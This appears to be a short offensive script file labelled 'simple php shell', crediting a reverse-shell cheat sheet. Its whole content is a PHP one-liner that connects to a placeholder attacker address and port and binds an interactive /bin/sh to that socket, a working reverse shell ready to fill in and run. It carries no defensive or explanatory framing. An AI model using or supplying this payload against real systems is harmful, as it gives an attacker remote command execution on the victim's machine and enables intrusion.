/*
* simple php shell | Author: r00t-3xp10it
* credits: https://highon.coffee/blog/reverse-shell-cheat-sheet/
*/
php -r '$sock=fsockopen("IpAdDr",P0rT);exec("/bin/sh -i <&3 >&3 2>&3");'
